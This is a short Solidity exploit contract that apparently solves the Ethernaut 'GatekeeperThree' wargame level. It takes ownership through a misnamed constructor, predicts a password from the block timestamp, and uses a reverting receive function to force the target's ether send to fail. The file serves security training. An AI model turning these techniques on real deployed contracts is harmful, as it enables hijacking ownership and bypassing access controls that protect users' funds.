//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./GatekeeperThree.sol";

contract HackGates {
    GatekeeperThree public gates = GatekeeperThree(payable(0xFa5Ff60674ae929aeB4195b00775BBe0886df5FF));

    function hack(uint _password) public returns (bool){
        // gateOne() require(msg.sender == owner); require(tx.origin != owner);
        gates.construct0r();
        require(gates.owner() == address(this), "Failed construct0r");

        // gateTwo() require(allow_enterance == true);
        gates.getAllowance(_password);
        require( gates.allow_enterance() == true, "Failed getAllowance()");

        //gateThree() (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false)
        payable(address(gates)).transfer(1000000000000001 wei);
        require(address(gates).balance > 0, "Initial funds not transferred.");

        gates.enter();

        return true;
    }

    function setTrick() public returns (uint _password) {
        _password = block.timestamp;
        gates.createTrick();
    }

    receive() external payable {
        if(msg.sender == address(gates)) {
            revert();
        }
    }

}   